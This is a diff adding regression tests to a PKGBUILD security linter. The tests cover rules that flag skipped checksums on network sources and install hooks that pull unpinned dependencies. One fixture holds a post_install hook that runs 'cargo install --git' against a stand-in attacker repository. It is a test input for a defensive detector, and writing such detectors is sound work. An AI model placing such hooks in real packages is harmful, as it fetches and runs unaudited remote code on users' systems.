@@ -123,11 +123,73 @@ def test_int003_does_not_fire_on_skip_for_local_file(make_pkgbuild_ctx):
     assert list(INT003SkippedChecksumOnNetworkSource().check(ctx)) == []
 
 
+def test_int003_does_not_fire_when_a_second_checksum_array_protects_source(make_pkgbuild_ctx):
+    # Regression: only the first-declared checksum array was inspected, so
+    # b2sums=('SKIP') falsely flagged sources that sha256sums (declared second)
+    # actually protects.
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
+        b2sums=('SKIP' 'SKIP')
+        sha256sums=('deadbeef' 'deadbeef')
+        """
+    )
+    assert list(INT003SkippedChecksumOnNetworkSource().check(ctx)) == []
+
+
+def test_int003_checks_every_source_even_when_first_array_is_shorter(make_pkgbuild_ctx):
+    # Regression: iteration used to break as soon as the *first-declared* checksum
+    # array ran out of entries, silently skipping every later source instead of
+    # checking it against the other declared arrays.
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
+        b2sums=('SKIP')
+        sha256sums=('deadbeef' 'SKIP')
+        """
+    )
+    findings = list(INT003SkippedChecksumOnNetworkSource().check(ctx))
+    assert len(findings) == 1
+    assert "b.tar.gz" in findings[0].message
+
+
+def test_int003_fires_on_skip_for_sha1sums(make_pkgbuild_ctx):
+    # Regression: CHECKSUM_KEYS only recognized sha256sums/sha512sums/b2sums/
+    # md5sums, so a PKGBUILD using only sha1sums (also fully supported by
+    # makepkg) had an empty ctx.checksums and INT003 never ran at all.
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        source=("https://example.com/foo.tar.gz")
+        sha1sums=('SKIP')
+        """
+    )
+    assert len(list(INT003SkippedChecksumOnNetworkSource().check(ctx))) == 1
+
+
 def test_int005_fires_on_npm_install_in_post_install(make_install_ctx):
     ctx = make_install_ctx(
         """
         post_install() {
           npm install atomic-lockfile
+        }
+        """
+    )
+    findings = list(INT005InstallHookPullsUnpinnedDeps().check(ctx))
+    assert len(findings) == 1
+    assert findings[0].severity.name == "HIGH"
+
+
+def test_int005_fires_on_cargo_install_in_post_install(make_install_ctx):
+    # Regression: _PACKAGE_MANAGERS was a fixed set missing cargo/gem/composer/
+    # luarocks, so install hooks using those to fetch unaudited code bypassed
+    # the rule entirely even though it's the same technique.
+    ctx = make_install_ctx(
+        """
+        post_install() {
+          cargo install --git https://github.com/attacker/x evil
         }
         """
     )
